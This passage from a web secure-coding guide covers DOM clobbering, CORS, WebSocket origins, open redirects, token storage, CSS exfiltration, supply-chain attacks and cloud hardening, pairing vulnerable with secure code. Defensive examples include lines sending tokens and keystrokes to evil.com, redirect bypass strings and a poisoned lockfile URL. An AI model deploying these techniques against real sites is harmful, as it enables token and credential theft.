// SECURE — allowlist specific origins
const ALLOWED_ORIGINS = new Set(["https://app.example.com", "https://admin.example.com"]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", "true");
  }
  next();
});
```

## DOM Clobbering

DOM clobbering exploits the browser's behavior of creating global variables from HTML elements with `id` or `name` attributes. If an attacker can inject HTML (even without scripts), they can overwrite JavaScript variables.

```html
<!-- Attacker injects this HTML (e.g., via sanitized but not stripped HTML) -->
<form id="config"><input name="apiUrl" value="https://evil.com/steal"></form>

<!-- Application JavaScript uses window.config.apiUrl -->
<script>
  // Developer expects config to be a JS object
  // But DOM clobbering made window.config point to the <form> element
  // window.config.apiUrl returns the <input>'s value attribute
  fetch(config.apiUrl + "/data", { credentials: "include" }); // Sends data to evil.com!
</script>
```

**Prevention:**

```javascript
// SECURE — never access global variables directly; use explicit initialization
const config = Object.freeze({
  apiUrl: "https://api.example.com",
});

// SECURE — use a namespace that cannot be clobbered
const APP = Object.create(null); // No prototype, no DOM clobbering
APP.config = { apiUrl: "https://api.example.com" };

// SECURE — validate before use
const url = typeof config === "object" && !(config instanceof HTMLElement)
  ? config.apiUrl
  : DEFAULT_API_URL;
```

**Rule:** Never rely on globally-scoped variables that could share names with DOM element IDs. Use explicit module-scoped or const variables. If using a sanitizer like DOMPurify, enable `SANITIZE_NAMED_PROPS` to strip `id` and `name` attributes.

## WebSocket Origin Validation

WebSocket connections are not subject to same-origin policy. Any website can open a WebSocket to your server. You MUST validate the `Origin` header.

```javascript
// VULNERABLE — no origin check on WebSocket upgrade
const wss = new WebSocket.Server({ port: 8080 });
wss.on("connection", (ws) => {
  ws.on("message", (data) => {
    // Processes messages from any origin
  });
});

// SECURE — validate origin on upgrade
const wss = new WebSocket.Server({ noServer: true });

server.on("upgrade", (request, socket, head) => {
  const origin = request.headers.origin;
  const allowedOrigins = ["https://app.example.com", "https://admin.example.com"];

  if (!allowedOrigins.includes(origin)) {
    socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
    socket.destroy();
    return;
  }

  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit("connection", ws, request);
  });
});

// ALSO — authenticate WebSocket connections
wss.on("connection", (ws, request) => {
  // Validate session/token from cookies or query params
  const session = validateSession(request);
  if (!session) {
    ws.close(1008, "Unauthorized");
    return;
  }
  ws.userId = session.userId;
});
```

**Core Rules for WebSockets:**
1. Validate `Origin` header on every WebSocket upgrade request
2. Authenticate the connection using session cookies or tokens
3. Validate and sanitize all incoming WebSocket messages (same as HTTP input)
4. Implement rate limiting on WebSocket messages
5. Set maximum message size to prevent DoS

## Open Redirect Prevention

Open redirects allow attackers to redirect users from a trusted domain to a malicious site, enabling phishing and token theft.

```javascript
// VULNERABLE — redirects to any URL
app.get("/redirect", (req, res) => {
  res.redirect(req.query.url); // Attacker: /redirect?url=https://evil.com/phish
});

// VULNERABLE — incomplete validation (bypassed by attacker)
app.get("/redirect", (req, res) => {
  const url = req.query.url;
  if (url.startsWith("https://example.com")) {
    res.redirect(url);
  }
  // Bypassed with: https://example.com.evil.com
  // Bypassed with: https://example.com@evil.com (userinfo section)
});

// SECURE — allowlist of paths (no external redirects)
app.get("/redirect", (req, res) => {
  const url = req.query.url;
  // Only allow relative paths (no protocol = no external redirect)
  if (!url || url.startsWith("//") || url.includes("://")) {
    return res.redirect("/");
  }
  // Ensure it starts with / and doesn't contain backslash (IE quirk)
  if (!url.startsWith("/") || url.includes("\\")) {
    return res.redirect("/");
  }
  res.redirect(url);
});

// SECURE — strict domain validation for external redirects
function isSafeRedirectUrl(url) {
  try {
    const parsed = new URL(url);
    const allowedHosts = new Set(["example.com", "app.example.com"]);
    return parsed.protocol === "https:" && allowedHosts.has(parsed.hostname);
  } catch {
    return false;
  }
}
```

**Open redirect bypass patterns to defend against:**
- `//evil.com` — protocol-relative URL
- `https://example.com@evil.com` — userinfo section ignored by browsers
- `https://example.com.evil.com` — substring match bypass
- `\/\/evil.com` — backslash treated as forward slash in some browsers
- `https://evil.com#https://example.com` — fragment confusion
- URL-encoded variants: `https%3A%2F%2Fevil.com`

## localStorage and Sensitive Data

```javascript
// VULNERABLE — storing sensitive data in localStorage
localStorage.setItem("authToken", jwtToken);    // Accessible to any XSS
localStorage.setItem("userData", JSON.stringify({
  ssn: "123-45-6789",                           // Persists after session ends
  creditCard: "4111111111111111"
}));

// SECURE — use HttpOnly cookies for auth tokens (inaccessible to JS)
// For data that must be in JS memory, use sessionStorage (cleared on tab close)
// and never store PII or financial data client-side

// If you must cache data client-side:
// 1. Use sessionStorage (not localStorage) — cleared when tab closes
// 2. Never store tokens, passwords, PII, or financial data
// 3. Encrypt if storing any semi-sensitive data
// 4. Clear on logout
function clearClientStorage() {
  sessionStorage.clear();
  localStorage.clear();
  // Also clear IndexedDB, Cache API, etc.
}
```

**Rule:** Never store authentication tokens in `localStorage`. It is accessible to any JavaScript on the page, including XSS payloads. Use HttpOnly cookies for authentication.

## Service Worker Security

Service workers intercept all network requests for a domain. A compromised service worker gives an attacker persistent control.

```javascript
// SECURE — service worker registration best practices
if ("serviceWorker" in navigator) {
  // 1. Only register over HTTPS (browser enforces this)
  // 2. Serve the service worker from the app's origin
  // 3. Use a narrow scope
  navigator.serviceWorker.register("/sw.js", {
    scope: "/app/",  // Narrow scope — don't use "/"
  });
}

// In the service worker itself:
// VULNERABLE — caching sensitive responses
self.addEventListener("fetch", (event) => {
  event.respondWith(caches.match(event.request) || fetch(event.request));
  // This caches everything, including authenticated API responses!
});

// SECURE — only cache static assets, never authenticated responses
self.addEventListener("fetch", (event) => {
  const url = new URL(event.request.url);
  // Only cache static assets
  if (url.pathname.startsWith("/static/") || url.pathname.startsWith("/assets/")) {
    event.respondWith(caches.match(event.request) || fetch(event.request));
  }
  // Let all other requests pass through to the network
});
```

**Core Rules for service workers:**
1. Never cache authenticated API responses in the service worker cache
2. Use the narrowest possible scope for service worker registration
3. Implement a kill switch — ability to unregister service workers remotely
4. Set short `Cache-Control` headers on the service worker file itself so updates propagate
5. Audit service worker code for fetch interception that could leak credentials

## Verification

- Test for prototype pollution by sending `{"__proto__": {"polluted": true}}` and checking if `({}).polluted` returns `true`
- Check all `postMessage` listeners for origin validation
- Check all external links for `rel="noopener noreferrer"`
- Check CORS headers — `Access-Control-Allow-Origin: *` with credentials is a vulnerability
- Test all redirect parameters with `https://evil.com` and bypass patterns
- Check that `localStorage` does not contain auth tokens or PII
- Verify WebSocket connections validate the `Origin` header
- Check for DOM elements with `id` attributes that match JavaScript variable names
- Audit service worker `fetch` handlers for credential leakage

---

## Token Storage: The BFF Pattern

**Rule: Any data accessible to JavaScript is accessible to XSS. Store tokens in httpOnly cookies, not localStorage/sessionStorage.**

Vulnerable:
```javascript
// VULNERABLE — any XSS steals the token
localStorage.setItem('token', response.accessToken);
// Attacker: fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
```

Secure:
```javascript
// SECURE — Backend-for-Frontend pattern
// Server sets httpOnly cookie — JavaScript cannot read it
res.cookie('session', encrypt(tokens.access_token), {
  httpOnly: true,   // invisible to document.cookie
  secure: true,     // HTTPS only
  sameSite: 'lax',  // CSRF protection
  maxAge: 3600000,
});
// Client just sends credentials: 'include' — cookie sent automatically
```

## CSS Injection and Data Exfiltration

**Rule: CSS attribute selectors can exfiltrate data without JavaScript, bypassing XSS defenses. Never allow user-controlled CSS.**

CSS can probe HTML attribute values character by character and trigger network requests for each match:

```css
/* Exfiltrate CSRF token character by character */
input[name="csrf"][value^="a"] { background: url(https://evil.com/leak?char=a); }
input[name="csrf"][value^="b"] { background: url(https://evil.com/leak?char=b); }
```

Defense:
- Never inject user input into style tags or class attributes
- CSP: restrict img-src and style-src
- For user themes, use an allowlist map of predefined class sets

## CSS-Based Keylogging

**Rule: In frameworks where controlled inputs sync the value attribute on every keystroke, CSS attribute selectors fire per-keypress, enabling keystroke capture via background-image requests.**

```css
/* CSS keylogger — fires on every keystroke in React controlled inputs */
input[type="password"][value$="a"] { background: url(https://evil.com/log?key=a); }
```

## TypeScript Runtime Validation Gap

**Rule: TypeScript types are erased at compile time. External data (API responses, user input, URL params) must be validated at runtime with Zod or equivalent — type assertions (as) provide zero security.**

Vulnerable:
```typescript
// VULNERABLE — type assertion is a lie at runtime
const user = (await response.json()) as User;
// If API returns { role: "superadmin" }, TypeScript won't catch it
```

Secure:
```typescript
// SECURE — runtime validation matches the type
const UserSchema = z.object({
  id: z.string().uuid(),
  email: z.string().email(),
  role: z.enum(['admin', 'user']),
});
type User = z.infer<typeof UserSchema>;
const user = UserSchema.parse(await response.json());
```

## Iframe Sandbox Best Practices

**Rule: The sandbox attribute starts with zero permissions — add back only what's needed. Never combine allow-scripts with allow-same-origin (the iframe can remove its own sandbox).**

```html
<!-- SECURE — minimal permissions for a payment widget -->
<iframe
  src="https://payments.provider.com/form"
  sandbox="allow-scripts allow-forms"
  referrerpolicy="no-referrer"
></iframe>

<!-- VULNERABLE — iframe can remove its own sandbox -->
<iframe sandbox="allow-scripts allow-same-origin" src="..."></iframe>
```

## Third-Party Script Isolation

**Rule: Third-party JavaScript runs with the same privileges as your own code. Isolate via sandboxed iframes, restrict via CSP, and use SRI for integrity.**

- Load third-party widgets in sandboxed iframes, not inline scripts
- CSP: restrict script-src to known domains
- SRI: integrity attributes on all CDN-loaded scripts
- Use hosted payment fields so card data never touches your JavaScript (PCI DSS 4.0)

## SPA Client-Side Auth Bypass

**Rule: Client-side route guards are UX, not security. The server must validate auth on every API request independently.**

```javascript
// Client route guard is for UX only
function ProtectedRoute({ children }) {
  const { user } = useAuth();
  if (!user) return <Navigate to="/login" />;
  return children;
}

// REAL security: server validates every request
app.get('/api/admin/users', authenticate, authorize('admin'), handler);
```

── Page 15 ──

# Chapter 14: Business Logic Vulnerabilities

**Threat Summary:** Business logic flaws arise from incorrect assumptions about user behavior. They cannot be detected by automated scanners and require understanding of the application's intended workflows.

**Severity:** HIGH

## Quick Reference: Common Business Logic Flaws

| Category | Example Attack | Defense |
|----------|---------------|---------|
| Workflow bypass | Skip payment step, access delivery page directly | Enforce step completion server-side |
| Negative values | Transfer -$1000 from A to B (moves $1000 from B to A) | Validate value ranges |
| Quantity manipulation | Set quantity to 0, -1, or 999999 | Validate min/max bounds |
| Coupon abuse | Apply discount, then remove items; discount persists | Recalculate totals on every modification |
| Process step reordering | Complete step 3 before step 1 | Track and enforce workflow state |
| Limit circumvention | Split one $50,000 transfer into fifty $999 transfers | Apply limits cumulatively |
| Currency confusion | Change currency to a cheaper denomination | Normalize currency server-side |

## Core Rules

**Rule 1: Identify every assumption about user behavior, then systematically violate each one.**
For every feature, ask:
- What if the user submits a negative number?
- What if the user skips a step?
- What if the user repeats a step?
- What if the user submits a value of zero?
- What if the user submits the maximum integer value?
- What if the user submits an empty string?

**Rule 2: Validate business rules server-side on every state change, not just at the UI level.**

```javascript
// VULNERABLE — price calculated on the client
app.post("/api/checkout", async (req, res) => {
  const { items, totalPrice } = req.body; // Client sends the total
  await db.createOrder({ items, total: totalPrice });
});

// SECURE — price calculated on the server
app.post("/api/checkout", async (req, res) => {
  const { items } = req.body;
  const total = await calculateTotal(items); // Server calculates
  await db.createOrder({ items, total });
});
```

**Rule 3: Enforce multi-step process state server-side.**

```javascript
// Track workflow state in the session or database
const WORKFLOW_STEPS = ["cart", "shipping", "payment", "confirmation"];

app.post("/api/checkout/:step", async (req, res) => {
  const currentStep = await db.getCheckoutState(req.session.checkoutId);
  const requestedStep = req.params.step;

  const currentIndex = WORKFLOW_STEPS.indexOf(currentStep);
  const requestedIndex = WORKFLOW_STEPS.indexOf(requestedStep);

  // Only allow the next step
  if (requestedIndex !== currentIndex + 1) {
    return res.status(400).json({ error: "Invalid workflow step" });
  }

  // Process the step...
});
```

**Rule 4: Apply cumulative limits, not per-transaction limits.**
If the business rule is "maximum $10,000 per day," track the daily cumulative total, not just each individual transaction amount.


: Business Logic

### Rule 5: Deduplicate public counters to prevent inflation

Public-facing counters (view counts, download counts, popularity scores) are easily inflated by automated requests. A bot can refresh a page thousands of times to artificially boost a listing's popularity, manipulate rankings, and undermine the marketplace's integrity. Deduplicate counter increments by identity and time window.

```javascript
// VULNERABLE — increment on every request, no deduplication
app.get("/api/marketplace/:id", async (req, res) => {
  await db.listing.update({
    where: { id: req.params.id },
    data: { viewCount: { increment: 1 } },
  });
  // A bot refreshing every second adds 86,400 fake views per day
  // This manipulates rankings and misleads other users
  const listing = await db.listing.findUnique({ where: { id: req.params.id } });
  return res.json(listing);
});

// SECURE — deduplicate by identity + time window
app.get("/api/marketplace/:id", async (req, res) => {
  const listingId = req.params.id;

  // Use userId for authenticated users, anonymized IP for anonymous visitors
  const dedupeIdentity = req.userId
    ? `user:${req.userId}`
    : `ip:${anonymizeIp(req.ip)}`;
  const cacheKey = `view:${listingId}:${dedupeIdentity}`;

  // Only increment if this identity hasn't viewed in the last hour
  if (!await cache.get(cacheKey)) {
    await db.listing.update({
      where: { id: listingId },
      data: { viewCount: { increment: 1 } },
    });
    await cache.set(cacheKey, "1", { ex: 3600 }); // 1 hour dedup window
  }

  const listing = await db.listing.findUnique({ where: { id: listingId } });
  return res.json(listing);
});
```

This pattern applies to all public counters: download counts, share counts, "helpful" votes, and any metric that influences ranking or is displayed to users. Choose the dedup window based on the metric's sensitivity — 1 hour for views, 24 hours for votes.

### Rule 6: Validate temporal inputs (dates must be in valid ranges)

Date inputs are frequently accepted without validation, leading to logic bugs with security implications: expiration dates in the past that grant immediate access, free trial periods extending to year 9999 that grant essentially permanent free access, and scheduling dates before the Unix epoch that cause undefined behavior. Always validate that dates fall within a reasonable range for the specific use case.

```javascript
// VULNERABLE — accepts any date string without validation
app.post("/api/admin/coupon", requireAdmin, async (req, res) => {
  const freeUntil = new Date(req.body.freeUntil);
  await db.coupon.create({
    data: {
      code: req.body.code,
      freeUntil, // Could be year 9999, giving essentially permanent free access
      // Could be in the past, which may cause confusing behavior
      // Could be Invalid Date (NaN), which causes downstream errors
    },
  });
  return res.json({ success: true });
});

// SECURE — validate date is parseable, in the future, and within a reasonable range
app.post("/api/admin/coupon", requireAdmin, async (req, res) => {
  const freeUntil = new Date(req.body.freeUntil);
  const now = new Date();
  const maxFuture = new Date(now.getTime() + 365 * 24 * 60 * 60 * 1000); // 1 year

  // Check 1: Is it a valid date at all?
  if (isNaN(freeUntil.getTime())) {
    return res.status(400).json({ error: "Invalid date format" });
  }

  // Check 2: Is it in the future?
  if (freeUntil <= now) {
    return res.status(400).json({ error: "Date must be in the future" });
  }

  // Check 3: Is it within a reasonable range?
  if (freeUntil > maxFuture) {
    return res.status(400).json({ error: "Date must be within the next year" });
  }

  await db.coupon.create({
    data: {
      code: req.body.code,
      freeUntil,
    },
  });

  await auditLog({
    action: "COUPON_CREATED",
    actorId: req.adminId,
    actorType: "admin",
    targetType: "coupon",
    targetId: req.body.code,
    metadata: { freeUntil: freeUntil.toISOString() },
  });

  return res.json({ success: true });
});
```

Define the maximum valid range for each use case: coupons (1 year), subscription extensions (1 year), scheduled emails (30 days), cache TTLs (24 hours), temporary access grants (90 days).

---


## Verification

- Submit negative values in amount/quantity fields
- Skip steps in multi-step processes by directly accessing later URLs
- Apply discounts then modify the cart
- Submit the same request multiple times rapidly (see Chapter 18: Race Conditions)
- Test with boundary values: 0, -1, MAX_INT, empty string, null

---

── Page 16 ──

# Chapter 15: Supply Chain Security

**Threat Summary:** Supply chain attacks compromise the software before it reaches production by targeting dependencies, build systems, or distribution infrastructure. This is a new entry in the OWASP Top 10 2025 at #3.

**Severity:** CRITICAL

## Quick Reference: Supply Chain Attack Types

| Attack | Mechanism | Defense |
|--------|-----------|---------|
| Dependency confusion | Public package with same name as internal one, higher version | Use scoped packages (@company/pkg) |
| Typosquatting | Package name similar to a popular one | Verify package names carefully; use lockfiles |
| Lockfile injection | Malicious PR modifies lockfile to point to attacker registry | Use `npm ci`; review lockfile changes |
| Maintainer compromise | Attacker steals maintainer credentials | Pin exact versions; use SBOMs |
| Build system compromise | CI/CD pipeline manipulated | Verify build provenance; sign artifacts |

## Core Rules

**Rule 1: Use lockfiles and install with `npm ci` (not `npm install`) in CI/CD.**
`npm ci` refuses to modify the lockfile, detecting tampering.

**Rule 2: Use scoped packages for internal dependencies.**
`@mycompany/my-package` cannot be hijacked on the public registry because scopes are namespaced.

**Rule 3: Pin exact dependency versions.**
Avoid `^` and `~` version ranges in production. Exact versions (`"lodash": "4.17.21"`) prevent supply chain attacks from automatically pulling compromised new versions.

**Rule 4: Audit dependencies regularly.**
```bash
npm audit                   # Check for known vulnerabilities
npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm  # Verify registry URLs
```

**Rule 5: Review lockfile changes in PRs as carefully as source code changes.**
A modified lockfile can redirect a dependency to an attacker-controlled registry. Never auto-merge lockfile updates from external contributors.

**Rule 6: Generate and maintain SBOMs (Software Bill of Materials).**
Use CycloneDX or SPDX format. SBOMs enable rapid incident response when a library is compromised.

## Dependency Confusion Attack

Dependency confusion exploits the priority between internal (private) and public package registries. If an organization uses a private package called `@internal/utils` without scoping, an attacker publishes `internal-utils` on npm with a higher version number. The build system may pull the public version instead.

**Attack scenario:**

```
1. Attacker finds internal package name (from leaked package.json, error messages, GitHub)
2. Attacker publishes a package with the same name on the public npm registry
3. Attacker sets the version to 99.0.0 (higher than any internal version)
4. When the victim's CI/CD runs `npm install`, it may pull the public package
5. The attacker's package runs an install script that exfiltrates environment variables
```

**Prevention:**

```json
// .npmrc — force all packages to use the correct registry
@mycompany:registry=https://npm.mycompany.com/
registry=https://registry.npmjs.org/

// ALWAYS scope internal packages: @mycompany/utils, never just "utils"
```

```json
// package.json — use preinstall script to verify registry
{
  "scripts": {
    "preinstall": "npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm --validate-https"
  }
}
```

## Typosquatting Detection

Typosquatting packages use names similar to popular packages: `loddash` (vs `lodash`), `cross-env` (vs `crossenv`), `electorn` (vs `electron`).

**Detection methods:**

```bash
// Check for suspicious packages in your dependencies
npx npm-check --skip-unused  # Review all dependencies
npx socket-security audit     # AI-powered supply chain analysis

// Manual checks:
// 1. Search npm for your exact package name before installing
// 2. Check download counts (legitimate packages have high counts)
// 3. Check publication date (newly published copies of old packages are suspicious)
// 4. Check the package's GitHub repository link
```

**Rule:** Before adding any dependency, verify the package name matches the intended library, check its npm page for download counts and publication date, and verify the GitHub repository link.

## Lockfile Poisoning

A malicious contributor submits a PR that modifies the lockfile to point a dependency at an attacker-controlled registry or tarball URL.

```json
// LEGITIMATE lockfile entry
{
  "node_modules/lodash": {
    "version": "4.17.21",
    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
    "integrity": "sha512-..."
  }
}

// POISONED lockfile entry
{
  "node_modules/lodash": {
    "version": "4.17.21",
    "resolved": "https://evil-registry.com/lodash/-/lodash-4.17.21.tgz",
    "integrity": "sha512-..."  // Different hash, different content
  }
}
```

**Prevention:**

```bash
// Verify lockfile integrity in CI/CD
npx lockfile-lint \
  --path package-lock.json \
  --type npm \
  --allowed-hosts npm \
  --validate-https \
  --validate-integrity
```

## CI/CD Pipeline Security

CI/CD pipelines are high-value targets because they have access to secrets, deployment credentials, and production environments.

**Attack vectors:**

| Vector | Description | Defense |
|--------|-------------|---------|
| Poisoned PR | Malicious code in PR runs in CI | Don't run CI on untrusted PRs without approval |
| Secret exfiltration | CI scripts print or exfiltrate env secrets | Mask secrets; restrict secret access to main branch |
| Artifact tampering | Build artifacts modified before deployment | Sign artifacts; verify signatures before deploy |
| Self-hosted runner compromise | Attacker gets code execution on CI runner | Use ephemeral runners; don't share runners across repos |

```yaml
// GitHub Actions — secure CI configuration
name: CI
on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read  # Minimum permissions

jobs:
  build:
    runs-on: ubuntu-latest
    # Don't give secrets to PR builds from forks
    if: github.event.pull_request.head.repo.full_name == github.repository
    steps:
      - uses: actions/checkout@v4
      - run: npm ci          # Use ci, not install
      - run: npm audit --audit-level=high  # Fail on high/critical vulns
      - run: npm test
```

## SBOM Generation and Package Provenance

```bash
// Generate SBOM in CycloneDX format
npx @cyclonedx/cyclonedx-npm --output-file sbom.json --output-format json

// Generate SBOM in SPDX format
npx spdx-sbom-generator -o sbom-spdx.json

// Verify npm package provenance (npm v9+)
npm audit signatures  # Verify all packages have valid registry signatures
```

```json
// package.json — enable npm provenance for your own packages
{
  "publishConfig": {
    "provenance": true
  }
}
```

## Verification

- Run `npm audit` and address critical/high vulnerabilities
- Check that `npm ci` is used in CI/CD pipelines (not `npm install`)
- Verify lockfile integrity with `lockfile-lint`
- Review recent dependency additions for typosquatting
- Check for internal packages that could be confused with public ones
- Run `npm audit signatures` to verify package provenance
- Generate an SBOM and review for unexpected dependencies
- Check CI/CD configuration for secret exposure to fork PRs
- Verify `.npmrc` scopes internal packages correctly

---

── Page 17 ──

# Chapter 16: Cloud-Native Web Security

**Threat Summary:** Cloud-hosted web applications face additional threats from cloud metadata services, misconfigured storage, and overly permissive IAM roles.

**Severity:** CRITICAL (IMDS exploitation), HIGH (storage misconfiguration)

## Core Rules

**Rule 1: Enforce IMDSv2 on all AWS EC2 instances.**
IMDSv1 is trivially exploitable via SSRF. IMDSv2 requires a session token, blocking simple SSRF attacks.

**Rule 2: Never store secrets in environment variables that are logged or visible in crash dumps.**
Use a dedicated secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). Rotate secrets automatically.

**Rule 3: Apply least-privilege IAM roles.**
Every service should have the minimum permissions needed. Never use wildcard (`*`) permissions in production IAM policies.

**Rule 4: Secure cloud storage buckets.**
- Block public access by default
- Enable server-side encryption
- Enable access logging
- Use bucket policies that deny public read/write

**Rule 5: Scan container images for vulnerabilities.**
Use Trivy, Grype, or equivalent. Never run containers as root. Use distroless or minimal base images.

## Container Security

Running containers securely requires multiple layers of defense: non-root users, read-only filesystems, dropped capabilities, and minimal base images.

```dockerfile
// VULNERABLE Dockerfile
FROM node:20
COPY . /app
WORKDIR /app
RUN npm install
CMD ["node", "server.js"]
// Problems: runs as root, writable filesystem, full capabilities, large image

// SECURE Dockerfile
FROM node:20-slim AS builder
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --only=production
COPY . .
RUN npm run build

FROM gcr.io/distroless/nodejs20-debian12
WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
// Non-root user (distroless includes a nonroot user)
USER nonroot:nonroot
CMD ["dist/server.js"]
```

```yaml
// Kubernetes Pod security context
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
  containers:
    - name: app
      image: myapp:latest
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL          # Drop all Linux capabilities
        seccompProfile:
          type: RuntimeDefault
      resources:
        limits:
          memory: "256Mi"
          cpu: "500m"
        requests:
          memory: "128Mi"
          cpu: "250m"
      volumeMounts:
        - name: tmp
          mountPath: /tmp   # Writable tmp dir for apps that need it
  volumes:
    - name: tmp
      emptyDir:
        sizeLimit: 100Mi
```

**Container security checklist:**
1. Use multi-stage builds to exclude build tools from production images
2. Run as non-root user (never UID 0)
3. Use read-only root filesystem (`readOnlyRootFilesystem: true`)
4. Drop ALL Linux capabilities, add back only what is needed
5. Use distroless or Alpine base images (minimal attack surface)
6. Scan images with `trivy image myapp:latest` before deployment
7. Never store secrets in the image — use runtime secret injection

## Kubernetes RBAC

```yaml
// VULNERABLE — overly permissive ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: overly-permissive
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]     # God mode — never do this

// SECURE — least-privilege Role (namespace-scoped)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production
  name: app-reader
rules:
  - apiGroups: [""]
    resources: ["pods", "services"]
    verbs: ["get", "list", "watch"]  # Read-only access to specific resources
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["get"]
    resourceNames: ["app-config"]    # Specific configmap only

---
// Bind the role to a service account
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: production
  name: app-reader-binding
subjects:
  - kind: ServiceAccount
    name: app-service-account
    namespace: production
roleRef:
  kind: Role
  name: app-reader
  apiGroup: rbac.authorization.k8s.io
```

**Kubernetes RBAC rules:**
1. Use namespace-scoped `Role` (not `ClusterRole`) whenever possible
2. Never use wildcard `*` in apiGroups, resources, or verbs
3. Use `resourceNames` to restrict access to specific objects
4. Audit RBAC with `kubectl auth can-i --list --as=system:serviceaccount:prod:app-sa`
5. Disable auto-mounting of service account tokens when not needed

## Secret Management

**Never store secrets in:**
- Environment variables (visible in `ps`, crash dumps, process listings)
- Container images (extractable from layers)
- Kubernetes ConfigMaps (not encrypted at rest by default)
- Version control (even in private repos)

**Secure secret management patterns:**

```yaml
// Kubernetes — use External Secrets Operator with AWS Secrets Manager
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: app-secrets
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: aws-secrets-manager
    kind: SecretStore
  target:
    name: app-secrets-k8s
  data:
    - secretKey: DATABASE_URL
      remoteRef:
        key: prod/app/database-url
    - secretKey: API_KEY
      remoteRef:
        key: prod/app/api-key
```

```javascript
// Node.js — fetch secrets from Vault at startup (not from env)
import Vault from "node-vault";

async function getSecrets() {
  const vault = Vault({
    endpoint: "https://vault.internal:8200",
    token: await getVaultTokenFromK8sAuth(), // K8s auth, not hardcoded token
  });

  const { data } = await vault.read("secret/data/app/production");
  return {
    databaseUrl: data.data.DATABASE_URL,
    apiKey: data.data.API_KEY,
  };
}
```

## Service Mesh and mTLS

mTLS (mutual TLS) ensures both client and server authenticate each other, preventing service impersonation within the cluster.

```yaml
// Istio — enforce strict mTLS for all services in namespace
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: strict-mtls
  namespace: production
spec:
  mtls:
    mode: STRICT   # Reject any non-mTLS traffic
```

**Rule:** In microservice architectures, use a service mesh (Istio, Linkerd) with strict mTLS to encrypt all service-to-service traffic. Never rely on network segmentation alone.

## Cloud Metadata Service Lockdown

Beyond SSRF protection (Chapter 8), restrict metadata access at the infrastructure level:

```bash
// AWS — enforce IMDSv2 on all instances (blocks simple SSRF)
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxx \
  --http-tokens required \
  --http-put-response-hop-limit 1  # Limit to 1 hop (blocks container SSRF)

// GCP — use Workload Identity instead of node metadata
// Azure — use Managed Identity with restricted scope
```

```yaml
// Kubernetes — block metadata access with NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-metadata
  namespace: production
spec:
  podSelector: {}
  policyTypes: ["Egress"]
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32   # Block IMDS
```

## Subdomain Takeover

Subdomain takeover occurs when a DNS CNAME record points to a service (S3 bucket, Heroku app, Azure, GitHub Pages) that no longer exists. An attacker claims the resource and serves content on your subdomain.

**Vulnerable scenario:**

```
1. Company creates: blog.example.com → CNAME → myblog.herokuapp.com
2. Company deletes the Heroku app but forgets to remove the DNS record
3. Attacker creates "myblog" on Heroku
4. blog.example.com now serves attacker's content (on your domain!)
5. Attacker can: set cookies for *.example.com, host phishing pages, steal credentials
```

**Vulnerable services:**

| Service | Indicator of takeover vulnerability |
|---------|--------------------------------------|
| AWS S3 | "NoSuchBucket" error |
| Heroku | "No such app" page |
| GitHub Pages | 404 with GitHub branding |
| Azure | "NXDOMAIN" on the CNAME target |
| Shopify | "Sorry, this shop is currently unavailable" |
| Fastly | "Fastly error: unknown domain" |

**Prevention:**

```bash
// Audit DNS records for dangling CNAMEs
// Use tools like: subjack, can-i-take-over-xyz, nuclei

// 1. Remove DNS records when decommissioning services
// 2. Regularly audit all CNAME records
// 3. Use CNAME records only when necessary — use A records where possible
// 4. Monitor for subdomain takeover with automated scanning
```

**Core Rules:**
1. Remove DNS records BEFORE (or simultaneously with) decommissioning the service
2. Audit all CNAME records quarterly for dangling references
3. Use automated scanning tools to detect takeover-vulnerable subdomains
4. Never use wildcard DNS records (`*.example.com`) unless actively managed

## Verification

- Scan container images with `trivy image <image>` — no critical/high vulnerabilities
- Verify pods run as non-root: `kubectl get pod -o jsonpath='{.spec.containers[*].securityContext}'`
- Audit RBAC: `kubectl auth can-i --list --as=system:serviceaccount:ns:sa`
- Check for secrets in environment variables or ConfigMaps
- Verify mTLS is enforced between services
- Scan DNS records for dangling CNAMEs pointing to decommissioned services
- Verify cloud metadata access is restricted (IMDSv2, NetworkPolicy)
- Check that container filesystem is read-only

---

── Page 18 ──

# Chapter 17: Deserialization Attacks

**Threat Summary:** Deserialization converts data back into live objects. If the data is attacker-controlled, it can instantiate arbitrary classes and trigger code execution through "gadget chains."

**Severity:** CRITICAL

## Quick Reference: Dangerous Deserialization APIs

| Language | Dangerous API | Safe Alternative |
|----------|--------------|------------------|
| Java | `ObjectInputStream.readObject()` | JSON (Jackson, Gson) with type validation |
| Python | `pickle.loads()` | `json.loads()`, Protocol Buffers |
| PHP | `unserialize()` | `json_decode()` |
| Node.js | `node-serialize`, `js-yaml` unsafe load | `JSON.parse()`, `js-yaml.load()` (safe) |
| .NET | `BinaryFormatter` | `System.Text.Json`, `JsonSerializer` |
| Ruby | `Marshal.load()` | `JSON.parse()` |

## Core Rules

